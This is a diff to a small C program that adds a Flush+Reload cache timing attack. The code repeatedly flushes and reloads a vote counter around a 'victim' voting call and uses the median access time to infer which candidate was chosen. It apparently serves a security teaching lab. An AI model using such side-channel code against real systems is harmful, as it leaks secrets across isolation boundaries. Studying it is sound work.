@@ -26,10 +26,30 @@ void secret_vote(char candidate)
         votes_b++;
 }
 
+int compare(const void * a, const void * b) {
+   return ( *(uint64_t*)a - *(uint64_t*)b );
+}
+
 int main()
 {
-    secret_vote('a');
+    uint64_t num_cycles = 100;
+    uint64_t timing_cycles[num_cycles];
+    uint64_t median;
+
+    for (int i = 0; i < num_cycles; i++){
+        flush(&votes_a); //Attacker
+
+        secret_vote('a'); //Victim (Change this)
+
+        timing_cycles[i] = reload(&votes_a); //Attacker
+    }
+
+    qsort(timing_cycles, num_cycles, sizeof(uint64_t), compare);
+    median = timing_cycles[num_cycles/2];
 
     printf("Thank you, your vote has been securely registered.\n");
+    printf("Median time: %li\n", median);
+    /*If the victim voted for 'a', than the median access time for 'a' from the attacker will be low.
+    Otherwise, if the victim voted for 'b', than the median access time for 'a' from the attacker will be high.*/
     return 0;
 }
